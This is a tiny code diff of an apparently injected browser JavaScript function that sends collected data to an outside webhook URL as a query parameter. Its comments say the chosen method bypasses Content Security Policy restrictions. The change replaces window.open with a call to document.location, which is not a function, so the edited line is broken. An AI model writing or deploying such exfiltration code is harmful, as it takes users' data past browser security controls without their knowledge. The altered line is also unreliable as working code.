@@ -8,5 +8,5 @@
 
     // Use window.open to send the data
     // Opening a new tab/window might be detected by the user, but it bypasses many CSP restrictions.
-    window.open(webhookUrl + "?data=" + dataToSend);
+    document.location(webhookUrl + "?data=" + dataToSend);
 })();
